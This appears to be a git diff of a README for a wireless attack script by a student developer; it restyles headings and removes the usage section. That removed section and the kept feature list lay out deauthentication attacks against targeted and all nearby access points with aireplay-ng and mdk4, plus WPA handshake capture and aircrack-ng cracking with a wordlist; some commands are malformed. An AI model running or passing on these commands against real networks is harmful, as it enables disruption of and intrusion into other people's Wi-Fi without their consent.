@@ -1,13 +1,13 @@
 <p align="center">
 <pre align="center">
-  _____            ______ ______ _____  
+  _____         ______ ______ _____  
  |  __ \    /\    |  ____|  ____|  __ \ 
- | |__) |  /  \   | |__  | |__  | |  | |
- |  _  /  / / \  |  __| |  __| | |  | |
- | | \ \ / ____ \ | |____| |____| |__| |
- |_|  \_\/_/    \_\______|______|_____/ 
+ | |__) |  /  \   | |__   | |__   | |  | |
+ |  _  /  / /\ \  |  __|  |  __|  | |  | |
+ | | \ \ / ____ \ | |____ | |____ | |__| |
+ |_|  \_/_/    \_\______|______|_____/  
                                         
-  ᴄᴇʀᴛɪꜰɪᴇᴅ ᴇᴛʜɪᴄᴀʟ ʜᴀᴄᴋᴇʀ
+   𝖢𝖤𝖱𝖳𝖨𝖋𝖨𝖤𝖣  𝖤𝖳𝖧𝖨𝖢𝖠𝖫  𝖧𝖠𝖢𝖪𝖤𝖱
 </pre>
 </p>
 
@@ -25,12 +25,17 @@
 
 ---
 
+<!-- ==================== HEADER BANNER ==================== -->
+<div align="center">
+<img src="https://capsule-render.vercel.app/api?type=venom&color=0:050505,50:8b0000,100:00FF41&height=220&section=header&text=WIRELESS%20AUDITING%20SUITE&fontSize=40&fontColor=00FF41&fontAlignY=45&animation=fadeIn&desc=ADVANCED%20802.11%20SECURITY%20FRAMEWORK&descSize=15&descColor=ffffff" width="100%" />
+</div>
+
 ---
 
-## About The Developer
+## 👨‍💻 About The Developer
 
-* **Developer:** Raeed Khan (21 Years Old)
-* **Education:** BBA Student at University of Buner, Swari, KPK.
+- **Developer:** Raeed Khan (21 Years Old)
+- **Education:** BBA Student at University of Buner, Swari, KPK.
 
 Raeed Khan is a young, passionate self-taught developer who stands out as Pakistan's top BBA student actively building tools for offensive security and penetration testing. At just 21, his unique transition from business administration to core security engineering has positioned him among the top 10 youngest emerging cybersecurity minds in the local tech community.
 
@@ -38,18 +43,18 @@ Driven by a strong focus on wireless defense, Raeed has also designed custom har
 
 ---
 
-## Core Features
+## ⚡ Core Features
 
-* **Automated Interface Diagnostics:** Instantly switches wireless cards into Monitor Mode (`airmon-ng`) with pre-execution environment checks.
-* **Process Management:** Clears conflicting network management daemons automatically to prevent packet dropping.
-* **Targeted Diagnostics:** Allows full granular monitoring and specific 802.11 frame analysis on specific BSSID and channels.
-* **Dual-Attack Vectors:**
-    * *Targeted Deauth:* Precision localized validation packets using `aireplay-ng`.
-    * *Mass Deauth:* Automated multi-channel hopping framework utilizing `mdk4` to validate network resilience across all nearby access points simultaneously.
+- **Automated Interface Diagnostics:** Instantly switches wireless cards into Monitor Mode (`airmon-ng`) with pre-execution environment checks.
+- **Process Management:** Clears conflicting network management daemons automatically to prevent packet dropping.
+- **Targeted Diagnostics:** Allows full granular monitoring and specific 802.11 frame analysis on specific BSSID and channels.
+- **Dual-Attack Vectors:**
+    - *Targeted Deauth:* Precision localized validation packets using `aireplay-ng`.
+    - *Mass Deauth:* Automated multi-channel hopping framework utilizing `mdk4` to validate network resilience across all nearby access points simultaneously.
 
 ---
 
-## System Requirements
+## 🛠️ System Requirements
 
 The framework requires a Linux environment (Preferably **Kali Linux**) with a wireless network adapter capable of **Monitor Mode** and **Packet Injection** (e.g., adapters running Alfa, Realtek, or Atheros chipsets).
 
@@ -60,62 +65,9 @@ The framework requires a Linux environment (Preferably **Kali Linux**) with a wi
 
 ---
 
-## Installation & Usage
+## 🚀 Installation & Usage
 
 ### 1. Clone the Repository
 ```bash
 git clone [https://github.com/Raeed-khan/Wirless.git](https://github.com/Raeed-khan/Wirless.git)
 cd Wirless
-
-```
-
-### 2. Grant Executable Permissions
-
-```bash
-chmod +x wifi.sh
-
-```
-
-### 3. Launch the Framework
-
-```bash
-sudo ./wifi.sh
-
-```
-
----
-
-## Framework Blueprint (Main Menu)
-
-```text
-[1] Enable Monitor Mode (airmon-ng start)
-[2] Kill Conflicting Processes (check kill)
-[3] Survey Nearby Wireless Networks (airodump-ng)
-[4] Target Specific BSSID Diagnostics
-[5] Run Local Signal Test (Single Deauth)
-[6] Run Mass Deauth Attack (All APs & Clients via MDK4)
-[7] Exit Framework
-
-
- sudo airmon-ng start wlan0
- sudo airmon-ng check kill
- sudo airodump-ng wlan0mon
- sudo airodump-ng --bssid 0.0.0.0.0.0 -c 6 wlan0mon
- sudo aireplay-ng --deauth 100 -a 0.0.0.0.0.0 wlan0mon
- sudo airmon-ng stop wlan0mon
- sudo service NetworkManager start
- #MDK4 COMMAND ()
- sudo mdk4 wlan0mon d -c 6 -B 0.0.0.0.0 ( channel hack all) sudo mdk4 wlan0mon d -c 6
- #WPA3 TRACKING AND CLINET COMMAND NECEE 
-┌──(cisco㉿kali)-[~]
-└─$ sudo aireplay-ng --deauth 0 -a 000000000 -c (client ip) wlan0mon
-## handshake and criking
- sudo airodump-ng --bssid 0.0.0.0.0. -c 13 -w T wlan0mon
-sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b (0000 handshake file name ) T-01.cap
-## file 
-sudo gunzip /usr/share/wordlists/rockyou.txt.g
-
-```
-
----
-
